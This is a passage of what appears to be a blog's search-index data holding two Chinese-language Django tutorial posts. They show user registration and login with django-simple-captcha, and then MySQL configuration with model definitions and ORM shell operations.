class=\"string\">'index'</span>),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p>根目录下的urls.py<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.conf.urls <span class=\"keyword\">import</span> include, url</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.contrib <span class=\"keyword\">import</span> admin</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    <span class=\"comment\"># Examples:</span></span><br><span class=\"line\">    <span class=\"comment\"># url(r'^$', 'blog_week_8.views.home', name='home'),</span></span><br><span class=\"line\">    <span class=\"comment\"># url(r'^blog/', include('blog.urls')),</span></span><br><span class=\"line\">    url(<span class=\"string\">r''</span>,include(<span class=\"string\">'blog.urls'</span>)),</span><br><span class=\"line\">    url(<span class=\"string\">r'^admin/'</span>, include(admin.site.urls)),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p><strong>模板文件的代码</strong><br>index.html<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>welcome &#123;% if data %&#125;&#123;% for data in data%&#125; &#123;% if 'no' not in data %&#125; &#123;&#123;data&#125;&#125; <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"/sign_out/\"</span>&gt;</span>退出<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span> &#123;% endif%&#125; &#123;% endfor %&#125; &#123;% endif %&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"/login/\"</span>&gt;</span>登录 <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"/register/\"</span>&gt;</span>注册 <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>login.html<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>登录页面<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\">    &#123;% csrf_token %&#125;</span><br><span class=\"line\">    &#123;&#123;userform&#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"sumit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"login\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"/\"</span>&gt;</span>首页 <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"/register/\"</span>&gt;</span>注册 <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>register.html<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>注册页面<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\">    &#123;% csrf_token %&#125;</span><br><span class=\"line\">    &#123;&#123;userform&#125;&#125;</span><br><span class=\"line\">    验证码 <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"cap\"</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"&#123;&#123;'/captcha/'&#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"sumit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"register\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"/login/\"</span>&gt;</span>登录 <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"/\"</span>&gt;</span>首页 <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>项目代码<a href=\"https://github.com/Huseck/Django-study/tree/Django-study-4\" target=\"_blank\" rel=\"noopener\">https://github.com/Huseck/Django-study/tree/Django-study-4</a><br>本篇的运行结果图<br><img src=\"2.jpg\" alt=\"\"></p>\n<h3 id=\"例子四（2）\"><a href=\"#例子四（2）\" class=\"headerlink\" title=\"例子四（2）\"></a>例子四（2）</h3><ul>\n<li>主要关注的几个逻辑问题<ul>\n<li>怎么判断用户名是否重名</li>\n<li>继承自带的auth.user表是否能添加我们还需要的字段</li>\n<li>使用DjangoCaptcha判断机制是否符合要求</li>\n<li>forms继承的关系和判断form表单数据</li>\n<li>准备</li>\n<li>这里我们使用自带的auth_user实现注册、登录验证。</li>\n<li>安装pip install django-simple-captcha==0.5.6</li>\n<li>配置 settings.py</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.admin'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.auth'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.contenttypes'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.sessions'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.messages'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.staticfiles'</span>,</span><br><span class=\"line\">    <span class=\"string\">'blog'</span>,</span><br><span class=\"line\">    <span class=\"string\">'captcha'</span>,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>根目录下的urls.py也要配置验证码的路由</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    url(<span class=\"string\">r''</span>, include(<span class=\"string\">'blog.urls'</span>)),</span><br><span class=\"line\">    url(<span class=\"string\">r'^admin/'</span>, include(admin.site.urls)),</span><br><span class=\"line\">    url(<span class=\"string\">r'^captcha/'</span>, include(<span class=\"string\">'captcha.urls'</span>)),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>之后我们生成默认的数据库，成功之后会发现是有captcha_captchastore表的<br>然后开始编写我们的forms表单，blog目录下创建forms.py文件代码如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 _*-</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">author:seck</span></span><br><span class=\"line\"><span class=\"string\">time: 2018/02/09</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django <span class=\"keyword\">import</span> forms</span><br><span class=\"line\"><span class=\"keyword\">from</span> captcha.fields <span class=\"keyword\">import</span> CaptchaField</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.contrib.auth.forms <span class=\"keyword\">import</span> UserCreationForm, AuthenticationForm</span><br><span class=\"line\"><span class=\"keyword\">from</span> .models <span class=\"keyword\">import</span> Users</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CreateUser</span><span class=\"params\">(UserCreationForm)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\">#UserCreationForm  里面自带的会验证重名</span></span><br><span class=\"line\">    username = forms.CharField(error_messages=&#123;<span class=\"string\">'required'</span>:<span class=\"string\">u\"用户名不能为空\"</span>&#125;)</span><br><span class=\"line\">    password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;<span class=\"string\">'required'</span>:<span class=\"string\">u\"密码不能为空\"</span>&#125;)</span><br><span class=\"line\">    email = forms.CharField()</span><br><span class=\"line\">    captcha = CaptchaField()</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Auth</span><span class=\"params\">(AuthenticationForm)</span>:</span></span><br><span class=\"line\">    username = forms.CharField(error_messages=&#123;<span class=\"string\">'required'</span>: <span class=\"string\">'用户名不能为空'</span>&#125;)</span><br><span class=\"line\">    password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;<span class=\"string\">'required'</span>:<span class=\"string\">u\"密码不能为空\"</span>&#125;)</span><br><span class=\"line\">    captcha = CaptchaField()</span><br></pre></td></tr></table></figure>\n<p>我们编写一下视图函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.shortcuts <span class=\"keyword\">import</span> render,redirect</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.http <span class=\"keyword\">import</span> HttpResponse</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.contrib.auth <span class=\"keyword\">import</span> authenticate, login, logout</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.contrib.auth <span class=\"keyword\">import</span> models</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.contrib.auth.models <span class=\"keyword\">import</span> User</span><br><span class=\"line\"><span class=\"keyword\">from</span> .forms <span class=\"keyword\">import</span> CreateUser,Auth</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/index.html'</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    createform = CreateUser(data=request.POST <span class=\"keyword\">or</span> <span class=\"keyword\">None</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">\"POST\"</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> createform.is_valid():</span><br><span class=\"line\">            username = createform.clean_username()</span><br><span class=\"line\">            password = createform.clean_password2()</span><br><span class=\"line\">            email = createform.clean()[<span class=\"string\">'email'</span>]</span><br><span class=\"line\">            <span class=\"comment\">#django 默认的user表创建用户使用create_user函数</span></span><br><span class=\"line\">            user = User.objects.create_user(username=username,password=password,email=email)</span><br><span class=\"line\">            user.save()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">u\"注册成功\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            error_msg = createform.errors</span><br><span class=\"line\">            <span class=\"keyword\">print</span> error_msg</span><br><span class=\"line\">            <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/register.html'</span>,&#123;<span class=\"string\">\"errors\"</span>:error_msg&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/register.html'</span>,&#123;<span class=\"string\">\"createform\"</span>:createform&#125;)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">auth</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    authform = Auth(data=request.POST <span class=\"keyword\">or</span> <span class=\"keyword\">None</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">\"POST\"</span>:</span><br><span class=\"line\">        <span class=\"comment\">#判断输入的数据是否符合规则</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> authform.is_valid():</span><br><span class=\"line\">            login(request,authform.get_user())</span><br><span class=\"line\">            <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/index.html'</span>,&#123;&#125;)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\">#如果数据不符合规则，就显示错误信息</span></span><br><span class=\"line\">            error_msg=authform.errors</span><br><span class=\"line\">            <span class=\"keyword\">print</span> authform.errors</span><br><span class=\"line\">            <span class=\"keyword\">return</span> render(request, <span class=\"string\">'blog/login.html'</span>, &#123;<span class=\"string\">\"userform\"</span>: authform, <span class=\"string\">\"errors\"</span>: error_msg&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/login.html'</span>,&#123;<span class=\"string\">\"userform\"</span>:authform&#125;)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sign_out</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    logout(request)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> redirect(<span class=\"string\">\"/\"</span>)</span><br></pre></td></tr></table></figure>\n<p>问题一验证重名<br>我们的CreateForm继承UserCreateForm 这个类继承User 这个又继承AbstractUser<br>然后找到关键位置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在文件site-packages\\django\\contrib\\auth\\models.py  394行左右找到</span><br><span class=\"line\">error_messages=&#123;</span><br><span class=\"line\">            &apos;unique&apos;: _(&quot;A user with that username already exists.&quot;),</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    也就是is_valid  方法判断error是否有错误存在判断出重名  username 是unique=True 值唯一的定义</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"问题二验证码\"><a href=\"#问题二验证码\" class=\"headerlink\" title=\"问题二验证码\"></a>问题二验证码</h3><p>当我们登录或者注册一个用户的时候，浏览器点击返回，在用此验证码注册其他的账号时，验证码应该是失效的，django-simple-captcha满足。<br>问题三form表单的继承<br>我们继承了UserCreationForm 和AuthenticationForm进行数据的验证，使用自带的验证方法实现用户的注册和登录。</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>当django自带的数据表和验证方法不满足需求时，需要自行扩展接口功能，实现应用。</p>\n","categories":["Django"],"tags":["Django"]},{"title":"Django学习笔记(三)","url":"https://www.xjseck.com/2018/02/01/Django学习笔记-三/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><ol>\n<li>通过上一个笔记的学习，我们大致明白了Django怎么从Views 传到url中然后在templates中进行显示内容。这一篇我们讲学习models控制数据库数据进行操作。相关内容如下：<ul>\n<li>Django Models中相关的字段</li>\n<li>Django ORM模式的理解</li>\n<li>Django Models操作<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3>上一篇的源代码中blog目录下的Models.py中建立了相关的数据类。只需要执行如下命令就能在相应的数据库中建立表。源代码<a href=\"https://github.com/Huseck/Django-study/tree/Django-study-3\" target=\"_blank\" rel=\"noopener\">https://github.com/Huseck/Django-study/tree/Django-study-3</a><br>需要配置mysql的连接信息，以及创建数据库。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py makemigrations</span><br><span class=\"line\">$python manage.py migrate</span><br><span class=\"line\">#之后我们进行数据操作</span><br><span class=\"line\">$python manage.py shell   #进入shell命令下进行操作</span><br><span class=\"line\">&gt;&gt;&gt;from blog.models import New  #导入所需的模块</span><br><span class=\"line\">&gt;&gt;&gt;from datetime import * </span><br><span class=\"line\">#进行数据的增、删、改、查</span><br><span class=\"line\">&gt;&gt;&gt;New.objects.create(title=&quot;test1&quot;,body=&apos;test1&apos;,created_time=datetime.now(),modified_time=datetime.now(),author_id=1,category_id=1)</span><br><span class=\"line\">&gt;&gt;&gt;New.objects.get(title=&apos;test1&apos;).delete()</span><br><span class=\"line\">&gt;&gt;&gt;N=New.objects.get(title=&apos;seck&apos;)</span><br><span class=\"line\">&gt;&gt;&gt;N.body=(&apos;seck-test&apos;)</span><br><span class=\"line\">&gt;&gt;&gt;N.save()</span><br><span class=\"line\">#进行查操作显示数据的时候，注意要在Models.py中进行添加</span><br><span class=\"line\">    def __unicode__(self):</span><br><span class=\"line\">        return self.title</span><br><span class=\"line\">#其他filter 切片等操作自行百度学习</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"例子三\"><a href=\"#例子三\" class=\"headerlink\" title=\"例子三\"></a>例子三</h3><p>本例子中我们学习models模型操作数据库。<br>首先还是新建项目</p>\n<p>settings.py中配置Mysql<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\"><span class=\"string\">'default'</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">'ENGINE'</span>: <span class=\"string\">'django.db.backends.mysql'</span>,</span><br><span class=\"line\">    <span class=\"string\">'NAME'</span>: <span class=\"string\">'django-model'</span>,</span><br><span class=\"line\">    <span class=\"string\">'USER'</span>: <span class=\"string\">'root'</span>,</span><br><span class=\"line\">    <span class=\"string\">'PASSWORD'</span>: <span class=\"string\">'pass'</span>,</span><br><span class=\"line\">    <span class=\"string\">'HOST'</span>: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">    <span class=\"string\">'PORT'</span>: <span class=\"string\">'3306'</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后创建app models.py代码如下<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.db <span class=\"keyword\">import</span> models</span><br><span class=\"line\"><span class=\"comment\"># Create your models here.</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.db <span class=\"keyword\">import</span> models</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.utils.encoding <span class=\"keyword\">import</span> python_2_unicode_compatible</span><br><span class=\"line\"><span class=\"meta\">@python_2_unicode_compatible</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Author</span><span class=\"params\">(models.Model)</span>:</span></span><br><span class=\"line\">    name = models.CharField(max_length=<span class=\"number\">50</span>)</span><br><span class=\"line\">    qq = models.CharField(max_length=<span class=\"number\">10</span>)</span><br><span class=\"line\">    addr = models.TextField()</span><br><span class=\"line\">    email = models.EmailField()</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__str__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.name</span><br><span class=\"line\"><span class=\"meta\">@python_2_unicode_compatible</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Article</span><span class=\"params\">(models.Model)</span>:</span></span><br><span class=\"line\">    title = models.CharField(max_length=<span class=\"number\">50</span>)</span><br><span class=\"line\">    author = models.ForeignKey(Author)</span><br><span class=\"line\">    content = models.TextField()</span><br><span class=\"line\">    score = models.IntegerField()  <span class=\"comment\"># 文章的打分</span></span><br><span class=\"line\">    tags = models.ManyToManyField(<span class=\"string\">'Tag'</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__str__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.title</span><br><span class=\"line\"><span class=\"meta\">@python_2_unicode_compatible</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tag</span><span class=\"params\">(models.Model)</span>:</span></span><br><span class=\"line\">    name = models.CharField(max_length=<span class=\"number\">50</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__str__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span 